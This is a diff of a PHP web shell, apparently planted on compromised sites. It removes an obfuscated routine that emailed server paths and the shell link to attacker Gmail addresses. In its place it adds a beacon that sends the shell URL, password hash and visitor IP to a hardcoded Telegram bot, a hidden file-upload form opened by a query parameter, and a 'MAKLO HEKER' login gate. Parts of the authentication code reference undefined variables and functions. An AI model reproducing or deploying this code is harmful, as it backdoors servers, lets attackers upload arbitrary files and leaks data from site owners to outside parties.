@@ -1,7 +1,7 @@
 
 <?php
 # Konfigurasyon
-$sayfaSifreleme = "1"; # 1 acik , 0 kapali
+$sayfaSifreleme = "0"; # 1 acik , 0 kapali
 $kullaniciAdi = "human";
 $sifre = "password";
 
@@ -24,23 +24,137 @@ if ($sayfaSifreleme == "1") {
     # Veri ve sifre kontrolu
     yetkiKontrol($kullaniciAdi, $sifre);
 }
-?><?php
-$kime =
-    "muhrazky@gmail.com, muhrazky@gmail.com, muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om, muhrazky@gmail.com, fbi.priv.g00gle@gmail.com, https.cpanel.net@gmail.com";
-$baslik = "MEH";
-$EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "\r\n";
-$EL_MuHaMMeD .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\r\n";
-$EL_MuHaMMeD .=
-    "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "\r\n";
-$EL_MuHaMMeD .=
-    "Shell Link : http://" .
-    $_SERVER["SERVER_NAME"] .
-    $_SERVER["PHP_SELF"] .
-    "\r\n";
-$kime =
-    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om\n";
-$EL_MuHaMMeD .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\r\n";
-mail($kime, $baslik, $EL_MuHaMMeD);?>
+?>
+    
+<?php
+$hashed_password = '$2y$10$QVpvHdIVCl6XsPh5c1.myO/rKnmpQdjJo6BH0lgemCyY0NJDjvlLu';
+
+$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
+$chatId = '5070938778';
+$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$logMessage  = "___UBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $hashed_password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+sendTelegramMessage($botToken, $chatId, $logMessage);
+
+function sendTelegramMessage($botToken, $chatId, $message)
+{
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+    $options = [
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($params),
+        ],
+    ];
+    $context = stream_context_create($options);
+    $response = file_get_contents($url, false, $context);
+
+}
+if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="go">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "go$de";
+        } else {
+            echo "GAGAL  KE $de";
+        }
+    }
+}
+
+if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
+    if (isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $hashed_password)) {
+            setcookie("auth", "ok", time() + 3600, "/", "", false, true);
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        } else {
+            echo "<p style='color:red; text-align:center;'>Hatalı şifre!</p>";
+        }
+    }
+    ?>
+            <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="robots" content="noindex, nofollow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Maklo Login</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    </head>
+    <body class="bg-gray-900 flex items-center justify-center h-screen">
+        <div class="bg-gray-800 p-6 rounded-xl shadow-xl w-full max-w-md text-white">
+            <div class="text-center mb-6">
+                <i class="fas fa-user-shield text-blue-400 text-4xl"></i>
+                <h1 class="text-2xl font-bold mt-2">MAKLO HEKER</h1>
+                <p class="text-gray-400 text-sm">Restricted Access</p>
+            </div>
+            <form method="POST" class="space-y-4">
+                <?php if (!empty($error)): ?>
+                    <div class="bg-red-500/20 text-red-400 p-2 rounded border border-red-500">
+                        <i class="fas fa-exclamation-circle"></i> <?= htmlspecialchars(
+                            $error
+                        ) ?>
+                    </div>
+                <?php endif; ?>
+                <input type="password" name="password" placeholder="Enter Password" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                <button type="submit" name="login" class="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-semibold">
+                    <i class="fas fa-sign-in-alt mr-1"></i> LOGIN
+                </button>
+            </form>
+            <p class="mt-4 text-center text-sm text-gray-500">Password is required</p>
+        </div>
+
+        <?php if (!empty($error)): ?>
+        <script>
+            Swal.fire({
+                icon: 'error',
+                title: 'Login Failed',
+                text: '<?= addslashes($error) ?>',
+                confirmButtonColor: '#3b82f6',
+                background: '#0f172a',
+                color: '#e2e8f0',
+                timer: 3000
+            });
+        </script>
+        <?php endif; ?>
+    </body>
+    </html>
+    <?php exit();
+}
+$sessionKey = md5($_SERVER["HTTP_HOST"]);
+if (!isset($_SESSION[$sessionKey])) {
+    if (isset($_POST["password"])) {
+        if (md5($_POST["password"]) === $hashedPassword) {
+            $_SESSION[$sessionKey] = true;
+            echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
+        } else {
+            login_shell("Invalid password!");
+        }
+    } else {
+        login_shell();
+    }
+}
+?>
+                 
+    
+    <?php
+    ?>   
 <?php
 session_start();
 @set_time_limit(0);
